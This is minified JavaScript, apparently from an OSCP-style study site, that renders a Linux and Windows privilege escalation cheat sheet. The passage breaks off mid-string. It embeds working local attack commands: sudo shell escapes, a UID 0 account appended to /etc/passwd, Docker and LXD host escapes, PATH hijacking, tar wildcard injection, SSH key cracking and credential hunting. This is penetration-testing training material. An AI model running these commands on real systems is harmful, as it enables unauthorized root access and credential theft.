import{a as b,b as f,c as k,d as P,e as C,f as _}from"./chunk-VFOKBMI4.js";import{e as v,f as y}from"./chunk-7BWD45GD.js";import{$a as u,Ha as g,La as w,Ua as r,Va as n,W as c,Wa as e,X as x,Xa as l,ab as S,bb as E,cb as h,db as d,mb as t,va as a}from"./chunk-ETCZ6OUV.js";function M(o,s){if(o&1){let i=E();u(0),n(1,"h1",4),t(2,"Privilege Escalation"),e(),n(3,"p",5),t(4," Linux privilege escalation enumeration, misconfigurations and common escalation vectors. "),e(),n(5,"div",6)(6,"div",7),h("click",function(){c(i);let p=d();return x(p.selectTech("linux"))}),n(7,"div",8)(8,"span"),t(9,"\u{1F427}"),e()(),n(10,"div",9)(11,"h2"),t(12,"Linux PrivEsc"),e(),n(13,"p"),t(14," Enumeration, misconfigurations, credentials and privilege escalation techniques. "),e()()(),n(15,"div",7),h("click",function(){c(i);let p=d();return x(p.selectTech("windows"))}),n(16,"div",8)(17,"span"),t(18,"\u229E"),e()(),n(19,"div",9)(20,"h2"),t(21,"Windows PrivEsc"),e(),n(22,"p"),t(23," Windows privilege escalation techniques and common misconfigurations. "),e()()()(),S()}}function O(o,s){if(o&1){let i=E();u(0),n(1,"div",10)(2,"button",11),h("click",function(){c(i);let p=d();return x(p.back())}),t(3,"\u2190 Back to PrivEsc"),e(),n(4,"h2"),t(5,"Linux Privilege Escalation"),e(),n(6,"p",12),t(7," Systematic enumeration and identification of common Linux privilege escalation vectors. "),e(),n(8,"mat-accordion",13)(9,"mat-expansion-panel")(10,"mat-expansion-panel-header")(11,"mat-panel-title"),t(12,"1. Initial Enumeration"),e()(),n(13,"mat-accordion",13)(14,"mat-expansion-panel")(15,"mat-expansion-panel-header")(16,"mat-panel-title"),t(17,"Basic Enumeration"),e()(),n(18,"p")(19,"strong"),t(20,"Objective:"),e(),t(21," Understand the current user, groups, operating system and environment. "),e(),l(22,"app-terminal",14),n(23,"h3"),t(24,"What to look for"),e(),n(25,"ul")(26,"li"),t(27,"Interesting groups such as sudo, docker, lxd or adm."),e(),n(28,"li"),t(29,"Potentially vulnerable kernel versions."),e(),n(30,"li"),t(31,"Processes running as root."),e(),n(32,"li"),t(33,"Sensitive environment variables."),e()()(),n(34,"mat-expansion-panel")(35,"mat-expansion-panel-header")(36,"mat-panel-title"),t(37,"Process Enumeration"),e()(),n(38,"p"),t(39," Running processes can expose credentials, custom scripts and root-owned services. "),e(),l(40,"app-terminal",14),n(41,"h3"),t(42,"Useful Filters"),e(),l(43,"app-terminal",14),n(44,"h3"),t(45,"Example Red Flags"),e(),l(46,"app-terminal",14),n(47,"ul")(48,"li"),t(49,"Credentials exposed in command-line arguments."),e(),n(50,"li"),t(51,"Root executing scripts from writable directories."),e(),n(52,"li"),t(53,"Unknown or custom binaries running as root."),e(),n(54,"li"),t(55,"Services listening only on localhost."),e()()(),n(56,"mat-expansion-panel")(57,"mat-expansion-panel-header")(58,"mat-panel-title"),t(59,"Bash History"),e()(),n(60,"p"),t(61," Bash history may contain passwords, SSH commands, API keys and reused credentials. "),e(),n(62,"h3"),t(63,"Common History Files"),e(),l(64,"app-terminal",14),n(65,"h3"),t(66,"Search for Sensitive Information"),e(),l(67,"app-terminal",14),n(68,"h3"),t(69,"System-Wide Search"),e(),l(70,"app-terminal",14),e()()(),n(71,"mat-expansion-panel")(72,"mat-expansion-panel-header")(73,"mat-panel-title"),t(74,"2. Sudo Misconfigurations"),e()(),n(75,"mat-accordion",13)(76,"mat-expansion-panel")(77,"mat-expansion-panel-header")(78,"mat-panel-title"),t(79,"Initial Check"),e()(),n(80,"p")(81,"strong"),t(82,"Always run this early."),e(),t(83," Check which commands the current user can execute with sudo. "),e(),l(84,"app-terminal",14),n(85,"h3"),t(86,"Look for"),e(),n(87,"ul")(88,"li"),t(89,"NOPASSWD entries."),e(),n(90,"li"),t(91,"Wildcard permissions."),e(),n(92,"li"),t(93,"SETENV permissions."),e(),n(94,"li"),t(95,"Unsafe binaries executed as root."),e()()(),n(96,"mat-expansion-panel")(97,"mat-expansion-panel-header")(98,"mat-panel-title"),t(99,"High-Risk Binaries"),e()(),n(100,"p"),t(101," If one of these binaries is available through sudo, check GTFOBins immediately. "),e(),l(102,"app-terminal",14),e(),n(103,"mat-expansion-panel")(104,"mat-expansion-panel-header")(105,"mat-panel-title"),t(106,"Common Sudo Escapes"),e()(),n(107,"mat-accordion",13)(108,"mat-expansion-panel")(109,"mat-expansion-panel-header")(110,"mat-panel-title"),t(111,"Vim / Vi"),e()(),l(112,"app-terminal",14),e(),n(113,"mat-expansion-panel")(114,"mat-expansion-panel-header")(115,"mat-panel-title"),t(116,"Less / More"),e()(),l(117,"app-terminal",14),e(),n(118,"mat-expansion-panel")(119,"mat-expansion-panel-header")(120,"mat-panel-title"),t(121,"Find"),e()(),l(122,"app-terminal",14),e(),n(123,"mat-expansion-panel")(124,"mat-expansion-panel-header")(125,"mat-panel-title"),t(126,"Awk"),e()(),l(127,"app-terminal",14),e(),n(128,"mat-expansion-panel")(129,"mat-expansion-panel-header")(130,"mat-panel-title"),t(131,"Python"),e()(),l(132,"app-terminal",14),e(),n(133,"mat-expansion-panel")(134,"mat-expansion-panel-header")(135,"mat-panel-title"),t(136,"Perl"),e()(),l(137,"app-terminal",14),e()()()()(),n(138,"mat-expansion-panel")(139,"mat-expansion-panel-header")(140,"mat-panel-title"),t(141,"3. SUID Binaries"),e()(),n(142,"p"),t(143," SUID binaries execute with the privileges of their owner. Root-owned SUID binaries can potentially lead to privilege escalation. "),e(),l(144,"app-terminal",14),n(145,"h3"),t(146,"Example"),e(),l(147,"app-terminal",14),n(148,"p"),t(149," After identifying interesting binaries, check whether they can be abused using GTFOBins. "),e()(),n(150,"mat-expansion-panel")(151,"mat-expansion-panel-header")(152,"mat-panel-title"),t(153,"4. Linux Capabilities"),e()(),n(154,"p"),t(155," Linux capabilities can grant privileged functionality to binaries without requiring full root privileges. "),e(),n(156,"h3"),t(157,"Enumeration"),e(),l(158,"app-terminal",14),n(159,"h3"),t(160,"Dangerous Example"),e(),l(161,"app-terminal",14),n(162,"h3"),t(163,"Possible Abuse"),e(),l(164,"app-terminal",14),e(),n(165,"mat-expansion-panel")(166,"mat-expansion-panel-header")(167,"mat-panel-title"),t(168,"5. Cron Jobs"),e()(),n(169,"p"),t(170," Scheduled tasks are especially interesting when root executes scripts that can be modified by a lower-privileged user. "),e(),l(171,"app-terminal",14),n(172,"h3"),t(173,"Look for"),e(),n(174,"ul")(175,"li"),t(176,"Root-owned cron jobs."),e(),n(177,"li"),t(178,"Writable scripts executed by root."),e(),n(179,"li"),t(180,"Relative paths."),e(),n(181,"li"),t(182,"PATH hijacking opportunities."),e()()(),n(183,"mat-expansion-panel")(184,"mat-expansion-panel-header")(185,"mat-panel-title"),t(186,"6. Writable Files & Permissions"),e()(),n(187,"p"),t(188," Not every writable file is useful. Prioritize files that influence authentication, execution or privileged services. "),e(),l(189,"app-terminal",14),n(190,"h3"),t(191,"High-Value Targets"),e(),n(192,"ol")(193,"li"),t(194,"/etc/sudoers"),e(),n(195,"li"),t(196,"/etc/passwd"),e(),n(197,"li"),t(198,"/etc/shadow"),e(),n(199,"li"),t(200,"/etc/crontab"),e(),n(201,"li"),t(202,"/etc/cron.*"),e(),n(203,"li"),t(204,"Systemd service files."),e(),n(205,"li"),t(206,"Application configuration files."),e()()(),n(207,"mat-expansion-panel")(208,"mat-expansion-panel-header")(209,"mat-panel-title"),t(210,"7. Writable /etc/passwd"),e()(),n(211,"mat-accordion",13)(212,"mat-expansion-panel")(213,"mat-expansion-panel-header")(214,"mat-panel-title"),t(215,"Check Permissions"),e()(),l(216,"app-terminal",14),n(217,"p"),t(218," A writable "),n(219,"code"),t(220,"/etc/passwd"),e(),t(221," can potentially allow the creation of a privileged account. "),e()(),n(222,"mat-expansion-panel")(223,"mat-expansion-panel-header")(224,"mat-panel-title"),t(225,"Generate Password Hash"),e()(),l(226,"app-terminal",14),e(),n(227,"mat-expansion-panel")(228,"mat-expansion-panel-header")(229,"mat-panel-title"),t(230,"Create UID 0 User"),e()(),n(231,"p"),t(232," Replace "),n(233,"code"),t(234,"HASH"),e(),t(235," with the generated password hash. "),e(),l(236,"app-terminal",14),e(),n(237,"mat-expansion-panel")(238,"mat-expansion-panel-header")(239,"mat-panel-title"),t(240,"Switch User"),e()(),l(241,"app-terminal",14),e()()(),n(242,"mat-expansion-panel")(243,"mat-expansion-panel-header")(244,"mat-panel-title"),t(245,"8. Docker / LXD Groups"),e()(),n(246,"mat-accordion",13)(247,"mat-expansion-panel")(248,"mat-expansion-panel-header")(249,"mat-panel-title"),t(250,"Check Groups"),e()(),l(251,"app-terminal",14),n(252,"p"),t(253," Pay special attention to groups such as "),n(254,"code"),t(255,"docker"),e(),t(256,", "),n(257,"code"),t(258,"lxd"),e(),t(259," and other privileged groups. "),e()(),n(260,"mat-expansion-panel")(261,"mat-expansion-panel-header")(262,"mat-panel-title"),t(263,"Docker"),e()(),l(264,"app-terminal",14),e(),n(265,"mat-expansion-panel")(266,"mat-expansion-panel-header")(267,"mat-panel-title"),t(268,"LXD"),e()(),l(269,"app-terminal",14),e()()(),n(270,"mat-expansion-panel")(271,"mat-expansion-panel-header")(272,"mat-panel-title"),t(273,"9. PATH Hijacking"),e()(),n(274,"mat-accordion",13)(275,"mat-expansion-panel")(276,"mat-expansion-panel-header")(277,"mat-panel-title"),t(278,"PATH Reconnaissance"),e()(),l(279,"app-terminal",14),e(),n(280,"mat-expansion-panel")(281,"mat-expansion-panel-header")(282,"mat-panel-title"),t(283,"Writable PATH Directories"),e()(),l(284,"app-terminal",14),e(),n(285,"mat-expansion-panel")(286,"mat-expansion-panel-header")(287,"mat-panel-title"),t(288,"Create Hijack Binary"),e()(),l(289,"app-terminal",14),n(290,"p"),t(291," This becomes interesting when a privileged script executes commands without using absolute paths. "),e()()()(),n(292,"mat-expansion-panel")(293,"mat-expansion-panel-header")(294,"mat-panel-title"),t(295,"10. Wildcard Injection"),e()(),n(296,"p"),t(297," Wildcards can be dangerous when attacker-controlled filenames are expanded into arguments for privileged commands. "),e(),n(298,"h3"),t(299,"Common Risk Patterns"),e(),l(300,"app-terminal",14),n(301,"h3"),t(302,"Tar Example"),e(),l(303,"app-terminal",14),n(304,"p"),t(305," Always inspect the available options of the binary rather than guessing possible arguments. "),e()(),n(306,"mat-expansion-panel")(307,"mat-expansion-panel-header")(308,"mat-panel-title"),t(309,"11. Password & Credential Hunting"),e()(),n(310,"mat-accordion",13)(311,"mat-expansion-panel")(312,"mat-expansion-panel-header")(313,"mat-panel-title"),t(314,"Password Hunting"),e()(),l(315,"app-terminal",14),e(),n(316,"mat-expansion-panel")(317,"mat-expansion-panel-header")(318,"mat-panel-title"),t(319,"SSH Private Keys"),e()(),n(320,"h3"),t(321,"Find Keys"),e(),l(322,"app-terminal",14),n(323,"h3"),t(324,"Fix Permissions"),e(),l(325,"app-terminal",14),n(326,"h3"),t(327,"Login Using the Key"),e(),l(328,"app-terminal",14),n(329,"h3"),t(330,"Crack Protected Keys"),e(),l(331,"app-terminal",14),e()()(),n(332,"mat-expansion-panel")(333,"mat-expansion-panel-header")(334,"mat-panel-title"),t(335,"12. LD_PRELOAD"),e()(),n(336,"mat-accordion",13)(337,"mat-expansion-panel")(338,"mat-expansion-panel-header")(339,"mat-panel-title"),t(340,"Check Sudo Configuration"),e()(),l(341,"app-terminal",14),n(342,"p"),t(343,"Look for permissions related to environment preservation or SETENV."),e()(),n(344,"mat-expansion-panel")(345,"mat-expansion-panel-header")(346,"mat-panel-title"),t(347,"Compile Shared Library"),e()(),l(348,"app-terminal",14),e(),n(349,"mat-expansion-panel")(350,"mat-expansion-panel-header")(351,"mat-panel-title"),t(352,"Execute with LD_PRELOAD"),e()(),l(353,"app-terminal",14),e()()(),n(354,"mat-expansion-panel")(355,"mat-expansion-panel-header")(356,"mat-panel-title"),t(357,"13. Kernel Exploits"),e()(),n(358,"p"),t(359," Kernel exploitation should generally be considered after checking simpler and more reliable privilege escalation vectors. "),e(),l(360,"app-terminal",14),n(361,"p"),t(362," Always verify the exact kernel version and exploit requirements before attempting exploitation. "),e()(),n(363,"mat-expansion-panel")(364,"mat-expansion-panel-header")(365,"mat-panel-title"),t(366,"14. OSCP Mental Flow"),e()(),n(367,"p"),t(368," A simple workflow to avoid missing the most common Linux privilege escalation vectors. "),e(),l(369,"app-terminal",14),n(370,"h3"),t(371,"Quick Priority"),e(),n(372,"ol")(373,"li"),t(374,"Understand your current user and groups."),e(),n(375,"li"),t(376,"Run "),n(377,"code"),t(378,"sudo -l"),e(),t(379,"."),e(),n(380,"li"),t(381,"Enumerate SUID binaries."),e(),n(382,"li"),t(383,"Check capabilities."),e(),n(384,"li"),t(385,"Inspect cron jobs and scheduled tasks."),e(),n(386,"li"),t(387,"Look for writable files and scripts."),e(),n(388,"li"),t(389,"Check Docker and LXD group membership."),e(),n(390,"li"),t(391,"Search for credentials."),e(),n(392,"li"),t(393,"Consider kernel exploits as a later option."),e()()()()(),S()}if(o&2){let i=d();a(22),r("command",i.basicEnumeration),a(18),r("command",i.processEnumeration),a(3),r("command",i.processFilters),a(3),r("command",i.processRedFlags),a(18),r("command",i.bashHistory),a(3),r("command",i.bashHistorySearch),a(3),r("command",i.bashHistorySystem),a(14),r("command",i.sudoCheck),a(18),r("command",i.sudoHighRisk),a(10),r("command",i.sudoVim),a(5),r("command",i.sudoLess),a(5),r("command",i.sudoFind),a(5),r("command",i.sudoAwk),a(5),r("command",i.sudoPython),a(5),r("command",i.sudoPerl),a(7),r("command",i.suidEnumeration),a(3),r("command",i.suidExample),a(11),r("command",i.capabilities),a(3),r("command",i.capabilitiesExample),a(3),r("command",i.capabilitiesExploit),a(7),r("command",i.cronEnumeration),a(18),r("command",i.writableFiles),a(27),r("command",i.passwdPermissions),a(10),r("command",i.passwdHash),a(10),r("command",i.passwdInject),a(5),r("command",i.passwdSwitch),a(10),r("command",i.dockerGroups),a(13),r("command",i.dockerEscape),a(5),r("command",i.lxdEscape),a(10),r("command",i.pathRecon),a(5),r("command",i.pathWritable),a(5),r("command",i.pathHijack),a(11),r("command",i.wildcardExamples),a(3),r("command",i.wildcardTar),a(12),r("command",i.passwordHunting),a(7),r("command",i.sshKeys),a(3),r("command",i.sshKeyPermissions),a(3),r("command",i.sshLogin),a(3),r("command",i.sshKeyCrack),a(10),r("command",i.ldPreloadCheck),a(7),r("command",i.ldPreloadCompile),a(5),r("command",i.ldPreloadExploit),a(7),r("command",i.kernelEnumeration),a(9),r("command",i.oscpMentalFlow)}}function A(o,s){if(o&1){let i=E();u(0),n(1,"div",10)(2,"button",11),h("click",function(){c(i);let p=d();return x(p.back())}),t(3,"\u2190 Back to PrivEsc"),e(),n(4,"h2"),t(5,"Windows Privilege Escalation"),e(),n(6,"p",12),t(7," Windows privilege escalation enumeration, exploitation and OSCP methodology. "),e(),n(8,"mat-accordion",13)(9,"mat-expansion-panel")(10,"mat-expansion-panel-header")(11,"mat-panel-title"),t(12,"1. Identity & Token Enumeration"),e()(),n(13,"p"),t(14," Always start by identifying the current user, groups, privileges and integrity level. "),e(),l(15,"app-terminal",14),n(16,"p")(17,"strong"),t(18,"Important privileges:"),e()(),n(19,"ul")(20,"li")(21,"strong"),t(22,"SeBackupPrivilege"),e(),t(23," \u2192 Dump SAM / SYSTEM."),e(),n(24,"li")(25,"strong"),t(26,"SeRestorePrivilege"),e(),t(27," \u2192 Overwrite protected files."),e(),n(28,"li")(29,"strong"),t(30,"SeImpersonatePrivilege"),e(),t(31," \u2192 Token impersonation."),e(),n(32,"li")(33,"strong"),t(34,"High Integrity"),e(),t(35," \u2192 Elevated token."),e()()(),n(36,"mat-expansion-panel")(37,"mat-expansion-panel-header")(38,"mat-panel-title"),t(39,"2. Users & Groups"),e()(),n(40,"p"),t(41,"Enumerate local and domain users and identify privileged group membership."),e(),l(42,"app-terminal",14),e(),n(43,"mat-expansion-panel")(44,"mat-expansion-panel-header")(45,"mat-panel-title"),t(46,"3. System Enumeration"),e()(),l(47,"app-terminal",14),n(48,"p")(49,"strong"),t(50,"Drivers:"),e()(),l(51,"app-terminal",14),e(),n(52,"mat-expansion-panel")(53,"mat-expansion-panel-header")(54,"mat-panel-title"),t(55,"4. Network Enumeration"),e()(),l(56,"app-terminal",14),e(),n(57,"mat-expansion-panel")(58,"mat-expansion-panel-header")(59,"mat-panel-title"),t(60,"5. Credential Hunting"),e()(),n(61,"mat-accordion",13)(62,"mat-expansion-panel")(63,"mat-expansion-panel-header")(64,"mat-panel-title"),t(65,"File Searching"),e()(),l(66,"app-terminal",14),e(),n(67,"mat-expansion-panel")(68,"mat-expansion-panel-header")(69,"mat-panel-title"),t(70,"Registry Credentials"),e()(),l(71,"app-terminal",14),e(),n(72,"mat-expansion-panel")(73,"mat-expansion-panel-header")(74,"mat-panel-title"),t(75,"Saved Credentials"),e()(),l(76,"app-terminal",14),e(),n(77,"mat-expansion-panel")(78,"mat-expansion-panel-header")(79,"mat-panel-title"),t(80,"PowerShell History"),e()(),l(81,"app-terminal",14),e()()(),n(82,"mat-expansion-panel")(83,"mat-expansion-panel-header")(84,"mat-panel-title"),t(85,"6. Interesting Files Enumeration"),e()(),n(86,"p"),t(87," Search for configuration files, scripts, backups and documents that may contain credentials, connection strings, tokens or other useful information. "),e(),l(88,"app-terminal",14),e(),n(89,"mat-expansion-panel")(90,"mat-expansion-panel-header")(91,"mat-panel-title"),t(92,"7. Services Enumeration"),e()(),l(93,"app-terminal",14),n(94,"p")(95,"strong"),t(96,"Look for:"),e()(),n(97,"ul")(98,"li"),t(99,"Unquoted service paths."),e(),n(100,"li"),t(101,"Writable service binaries."),e(),n(102,"li"),t(103,"Weak service permissions."),e(),n(104,"li"),t(105,"Services running as SYSTEM."),e()()(),n(106,"mat-expansion-panel")(107,"mat-expansion-panel-header")(108,"mat-panel-title"),t(109,"8. Unquoted Service Paths"),e()(),n(110,"p"),t(111," An unquoted service path containing spaces may allow Windows to execute an unexpected binary if an intermediate directory is writable. "),e(),l(112,"app-terminal",14),n(113,"p")(114,"strong"),t(115,"All conditions must be true:"),e()(),n(116,"ul")(117,"li"),t(118,"The path contains spaces."),e(),n(119,"li"),t(120,"The executable path is not quoted."),e(),n(121,"li"),t(122,"An intermediate directory is writable."),e(),n(123,"li"),t(124,"The service can be triggered."),e()(),n(125,"p")(126,"strong"),t(127,"Important:"),e(),t(128," An unquoted path alone does not make a service exploitable. "),e()(),n(129,"mat-expansion-panel")(130,"mat-expansion-panel-header")(131,"mat-panel-title"),t(132,"9. Service Binary Hijacking"),e()(),n(133,"p"),t(134," If a service runs as SYSTEM and its executable is writable, replacing the binary can result in SYSTEM code execution. "),e(),l(135,"app-terminal",14),n(136,"p")(137,"strong"),t(138,"Exploitation conditions:"),e()(),n(139,"ul")(140,"li"),t(141,"Service runs as LocalSystem."),e(),n(142,"li"),t(143,"Binary is writable."),e(),n(144,"li"),t(145,"The service can be restarted or triggered."),e()(),n(146,"p")(147,"strong"),t(148,"OSCP rule:"),e()(),l(149,"app-terminal",14),e(),n(150,"mat-expansion-panel")(151,"mat-expansion-panel-header")(152,"mat-panel-title"),t(153,"10. DLL Hijacking"),e()(),n(154,"p"),t(155," Look for applications or services loading DLLs from writable directories. "),e(),l(156,"app-terminal",14),e(),n(157,"mat-expansion-panel")(158,"mat-expansion-panel-header")(159,"mat-panel-title"),t(160,"11. Scheduled Tasks"),e()(),n(161,"mat-accordion",13)(162,"mat-expansion-panel")(163,"mat-expansion-panel-header")(164,"mat-panel-title"),t(165,"Enumeration"),e()(),l(166,"app-terminal",14),e(),n(167,"mat-expansion-panel")(168,"mat-expansion-panel-header")(169,"mat-panel-title"),t(170,"Task Filtering"),e()(),l(171,"app-terminal",14),e(),n(172,"mat-expansion-panel")(173,"mat-expansion-panel-header")(174,"mat-panel-title"),t(175,"Inspect Task"),e()(),l(176,"app-terminal",14),e(),n(177,"mat-expansion-panel")(178,"mat-expansion-panel-header")(179,"mat-panel-title"),t(180,"Referenced Files"),e()(),l(181,"app-terminal",14),e(),n(182,"mat-expansion-panel")(183,"mat-expansion-panel-header")(184,"mat-panel-title"),t(185,"Permissions"),e()(),l(186,"app-terminal",14),e()()(),n(187,"mat-expansion-panel")(188,"mat-expansion-panel-header")(189,"mat-panel-title"),t(190,"12. SeImpersonatePrivilege Abuse"),e()(),n(191,"p"),t(192," Check whether the current account possesses SeImpersonatePrivilege. "),e(),l(193,"app-terminal",14),n(194,"p"),t(195," If the privilege is enabled, token impersonation techniques may allow escalation to SYSTEM depending on the Windows version and execution context. "),e(),l(196,"app-terminal",14),e(),n(197,"mat-expansion-panel")(198,"mat-expansion-panel-header")(199,"mat-panel-title"),t(200,"13. Backup Operators Abuse"),e()(),n(201,"p"),t(202," Backup-related privileges may allow access to protected registry hives and other sensitive files. "),e(),l(203,"app-terminal",14),n(204,"p")(205,"strong"),t(206,"Offline hash extraction:"),e()(),l(207,"app-terminal",14),n(208,"p")(209,"strong"),t(210,"Pass-the-Hash:"),e()(),l(211,"app-terminal",14),e(),n(212,"mat-expansion-panel")(213,"mat-expansion-panel-header")(214,"mat-panel-title"),t(215,"14. Kernel Exploits"),e()(),n(216,"p"),t(217," Consider kernel exploitation only after normal privilege escalation enumeration has been exhausted. "),e(),l(218,"app-terminal",14),e(),n(219,"mat-expansion-panel")(220,"mat-expansion-panel-header")(221,"mat-panel-title"),t(222,"15. Automated Enumeration"),e()(),n(223,"p"),t(224," Automated tools are useful for finding potential misconfigurations, but every finding should be manually verified. "),e(),l(225,"app-terminal",14),n(226,"p")(227,"strong"),t(228,"Always verify manually:"),e()(),l(229,"app-terminal",14),e(),n(230,"mat-expansion-panel")(231,"mat-expansion-panel-header")(232,"mat-panel-title"),t(233,"16. OSCP Mental Checklist"),e()(),n(234,"ol")(235,"li"),t(236,"Who am I?"),e(),n(237,"li"),t(238,"What privileges do I have?"),e(),n(239,"li"),t(240,"What groups am I a member of?"),e(),n(241,"li"),t(242,"Any interesting credentials?"),e(),n(243,"li"),t(244,"Any writable services?"),e(),n(245,"li"),t(246,"Any unquoted service paths?"),e(),n(247,"li"),t(248,"Any scheduled tasks?"),e(),n(249,"li"),t(250,"Do I have SeImpersonatePrivilege?"),e(),n(251,"li"),t(252,"Am I a member of Backup Operators?"),e(),n(253,"li"),t(254,"Any writable files or directories?"),e(),n(255,"li"),t(256,"Any interesting scripts or configuration files?"),e(),n(257,"li"),t(258,"Any kernel-level vulnerability?"),e()()(),n(259,"mat-expansion-panel")(260,"mat-expansion-panel-header")(261,"mat-panel-title"),t(262,"17. Windows PrivEsc Practical Checklist"),e()(),n(263,"mat-accordion",13)(264,"mat-expansion-panel")(265,"mat-expansion-panel-header")(266,"mat-panel-title"),t(267,"Initial Enumeration"),e()(),n(268,"ul")(269,"li"),t(270,"Ran whoami /all."),e(),n(271,"li"),t(272,"Checked privileges."),e(),n(273,"li"),t(274,"Checked groups."),e(),n(275,"li"),t(276,"Identified Integrity Level."),e()()(),n(277,"mat-expansion-panel")(278,"mat-expansion-panel-header")(279,"mat-panel-title"),t(280,"System & Patch Level"),e()(),n(281,"ul")(282,"li"),t(283,"Ran systeminfo."),e(),n(284,"li"),t(285,"Checked installed hotfixes."),e(),n(286,"li"),t(287,"Identified OS architecture."),e()()(),n(288,"mat-expansion-panel")(289,"mat-expansion-panel-header")(290,"mat-panel-title"),t(291,"Credential Hunting"),e()(),n(292,"ul")(293,"li"),t(294,"Searched for password files."),e(),n(295,"li"),t(296,"Checked registry credentials."),e(),n(297,"li"),t(298,"Checked cmdkey."),e(),n(299,"li"),t(300,"Checked PowerShell history."),e()()(),n(301,"mat-expansion-panel")(302,"mat-expansion-panel-header")(303,"mat-panel-title"),t(304,"Services & Tasks"),e()(),n(305,"ul")(306,"li"),t(307,"Enumerated services."),e(),n(308,"li"),t(309,"Checked unquoted service paths."),e(),n(310,"li"),t(311,"Checked service binary permissions."),e(),n(312,"li"),t(313,"Enumerated scheduled tasks."),e(),n(314,"li"),t(315,"Checked task binary/script permissions."),e()()(),n(316,"mat-expansion-panel")(317,"mat-expansion-panel-header")(318,"mat-panel-title"),t(319,"Privilege Abuse"),e()(),n(320,"ul")(321,"li"),t(322,"Checked SeImpersonatePrivilege."),e(),n(323,"li"),t(324,"Checked Backup Operators."),e(),n(325,"li"),t(326,"Checked writable files and directories."),e()()(),n(327,"mat-expansion-panel")(328,"mat-expansion-panel-header")(329,"mat-panel-title"),t(330,"Advanced"),e()(),n(331,"ul")(332,"li"),t(333,"Ran automated enumeration tools."),e(),n(334,"li"),t(335,"Manually verified findings."),e(),n(336,"li"),t(337,"Checked for kernel vulnerabilities."),e()()()()()()(),S()}if(o&2){let i=d();a(15),r("command",i.windowsIdentity),a(27),r("command",i.windowsUsersGroups),a(5),r("command",i.windowsSystem),a(4),r("command",i.windowsDrivers),a(5),r("command",i.windowsNetwork),a(10),r("command",i.windowsCredentialHunting),a(5),r("command",i.windowsRegistryCredentials),a(5),r("command",i.windowsSavedCredentials),a(5),r("command",i.windowsPowerShellHistory),a(7),r("command",i.windowsInterestingFiles),a(5),r("command",i.windowsServices),a(19),r("command",i.windowsUnquotedPaths),a(23),r("command",i.windowsServiceBinary),a(14),r("command",i.windowsServiceRule),a(7),r("command",i.windowsDLLHijacking),a(10),r("command",i.windowsScheduledTasks),a(5),r("command",i.windowsTaskFiltering),a(5),r("command",i.windowsTaskInspect),a(5),r("command",i.windowsTaskFiles),a(5),r("command",i.windowsTaskPermissions),a(7),r("command",i.windowsSeImpersonate),a(3),r("command",i.windowsPotato),a(7),r("command",i.windowsBackupOperators),a(4),r("command",i.windowsSecretsDump),a(4),r("command",i.windowsPassTheHash),a(7),r("command",i.windowsKernel),a(7),r("command",i.windowsAutomatedEnum),a(4),r("command",i.windowsManualVerify)}}var T=class o{selected=null;basicEnumeration=`
id
whoami
groups
hostname
uname -a
uname -r
arch
cat /etc/issue
cat /etc/os-release
ps aux
env
`;sudoCheck=`
sudo -l
`;sudoHighRisk=`
(root) NOPASSWD: /usr/bin/vim
(root) NOPASSWD: /usr/bin/less
(root) NOPASSWD: /usr/bin/find
(root) NOPASSWD: /usr/bin/awk
(root) NOPASSWD: /usr/bin/python
(root) NOPASSWD: /usr/bin/perl
(root) NOPASSWD: /usr/bin/tar *
`;sudoVim=`
sudo vim -c ':!/bin/bash'
`;sudoLess=`
sudo less /etc/passwd
!sh
`;sudoFind=`
sudo find . -exec /bin/sh \\; -quit
`;sudoAwk=`
sudo awk 'BEGIN {system("/bin/bash")}'
`;sudoPython=`
sudo python3 -c 'import os; os.system("/bin/bash")'
`;sudoPerl=`
sudo perl -e 'exec "/bin/bash";'
`;processEnumeration=`
ps aux
ps -ef
ps auxww
`;processFilters=`
ps aux | grep root
ps aux | grep -E "python|bash|sh|perl|php"
ps aux | grep -i password
ps auxww | grep -v "\\["
`;processRedFlags=`
root  /usr/bin/python /opt/app/app.py --db-pass=admin123
root  /tmp/backup.sh
root  /home/user/service --token=abcd1234
`;bashHistory=`
cat ~/.bash_history
cat /home/*/.bash_history
cat /root/.bash_history
`;bashHistorySearch=`
grep -i "password" ~/.bash_history
grep -i "ssh" ~/.bash_history
grep -i "wget" ~/.bash_history
grep -i "curl" ~/.bash_history
`;bashHistorySystem=`
find / -name ".bash_history" 2>/dev/null
find /home -type f -name ".bash_history" 2>/dev/null
`;suidEnumeration=`
find / -perm -u=s -type f 2>/dev/null
`;suidExample=`
find . -exec /bin/sh -p \\; -quit
`;capabilities=`
getcap -r / 2>/dev/null
`;capabilitiesExample=`
/usr/bin/python = cap_setuid+ep
`;capabilitiesExploit=`
python -c 'import os; os.setuid(0); os.system("/bin/sh")'
`;cronEnumeration=`
crontab -l
ls -lah /etc/cron*
cat /etc/crontab
`;writableFiles=`
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null
find / -perm -222 -type f 2>/dev/null
`;passwdPermissions=`
ls -l /etc/passwd
`;passwdHash=`
openssl passwd w00t
`;passwdInject=`
echo "root2:HASH:0:0:root:/root:/bin/bash" >> /etc/passwd
`;passwdSwitch=`
su root2

id
`;kernelEnumeration=`
uname -r
searchsploit linux kernel <version>
`;dockerGroups=`
id
groups
`;dockerEscape=`
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
`;lxdEscape=`
lxc init alpine privesc -c security.privileged=true

lxc config device add privesc root disk source=/ path=/mnt/root recursive=true

lxc start privesc

lxc exec privesc /bin/sh
`;pathRecon=`
echo $PATH
env | grep PATH
ps aux
crontab -l
cat /etc/crontab
ls -lah /etc/cron*
systemctl list-timers --all
`;pathWritable=`
find / -writable -type d 2>/dev/null | grep -E "tmp|home|var"

echo $PATH | tr ":" "\\n"
`;pathHijack=`
echo -e '#!/bin/bash\\n/bin/bash' > ls

chmod +x ls

export PATH=/tmp:$PATH
`;wildcardExamples=`
sudo /usr/bin/tar -czvf /backup/backup.tar.gz *

sudo zip archive.zip *

sudo rsync -a * /backup/

sudo chown root:root *

sudo chmod 755 *
`;wildcardTar=`
touch -- "--checkpoint=1"

touch -- "--checkpoint-action=exec=bash shell.sh"

sudo tar -czvf /tmp/backup.tar.gz *
`;passwordHunting=`
grep -Ri "password" /home 2>/dev/null

cat ~/.bash_history

cat /var/www/html/config.php
`;sshKeys=`
find / -name id_rsa 2>/dev/null
`;sshKeyPermissions=`
chmod 600 id_rsa
`;sshLogin=`
ssh -i id_rsa user@target
`;sshKeyCrack=`
ssh2john id_rsa > hash.txt

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
`;ldPreloadCheck=`
sudo -l
`;ldPreloadCompile=`
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
